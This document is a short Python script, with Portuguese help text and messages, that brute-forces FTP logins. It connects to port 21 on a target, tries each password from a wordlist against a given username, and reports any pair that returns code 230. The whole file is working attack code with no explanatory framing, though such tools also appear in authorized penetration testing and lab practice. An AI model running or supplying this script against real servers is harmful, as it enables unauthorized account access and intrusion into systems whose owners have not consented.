#!/usr/bin/python3

import socket,re,sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('ip', help='Endereco IPv4 do alvo')
parser.add_argument('-u','--user', help='Usuario a ser testado')
parser.add_argument('-w','--wordlist', help='Lista de senhas a serem testadas', type=argparse.FileType('r'))
parser.add_argument('-v','--verbose', help='Mostra as credenciais testadas em tempo real' ,action='store_true')


args = parser.parse_args()

target = args.ip
wordlist = args.wordlist.readlines()
user = args.user

print("Ataque Iniciado\r\n")
for word in wordlist:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)

	s.send(b"USER " + user.encode() + "\r\n".encode())
	s.recv(1024)
	s.send(b"PASS " + word.encode() + "\r\n".encode())
	resp = s.recv(1024)
	s.send(b"QUIT\r\n")
	if args.verbose:
		print("Testando credenciais -->",user+":"+word)
	if "230".encode() in resp:
		print("----------------------------------------------\n")
		print("[+] Credenciais validas -->",user+":"+word)
		print("----------------------------------------------")
		break

else:
	print("----------------------------------------------\n")
	print("[-] Nenhuma credencial testada e valida")
	print("\n----------------------------------------------")
